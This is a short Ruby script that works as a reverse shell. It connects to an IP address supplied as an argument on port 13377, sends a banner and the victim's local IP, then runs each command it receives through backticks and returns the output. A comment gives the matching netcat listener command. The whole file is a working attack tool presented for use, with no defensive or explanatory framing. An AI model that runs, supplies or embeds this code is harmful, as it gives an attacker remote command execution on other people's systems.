require 'socket'

we = <<~ASCII
  _____            _      _____          _      
 |  __ \\          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\
 | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \\_\\___|\\__,_|_/___|\\_____|\\___/ \\__,_|\\___|
ASCII

po = 13377 # nc -l -p 13377

if ARGV.empty?
  puts "Please provide the IP address as a command-line argument."
  exit(1)
end

ip = ARGV[0]
client_ip = Socket.ip_address_list.find { |addr| addr.ipv4? && !addr.ipv4_loopback? }.ip_address
we += "Client IP: #{client_ip}\n"

begin
  sock = TCPSocket.new(ip, po)
  puts "#{ip}:#{po}"
  sock.puts "#{we}\n"

  loop do
    sock.puts "$ "
    cmd = sock.gets.chomp

    break if cmd.nil?

    cmd.strip!

    if cmd == 'exit'
      break
    end

    output = `#{cmd}`
    sock.puts output
  end

rescue Errno::ECONNREFUSED => e
  puts "Connection refused: #{e}"
rescue StandardError => e
  puts "An error occurred: #{e}"
ensure
  sock&.close
end
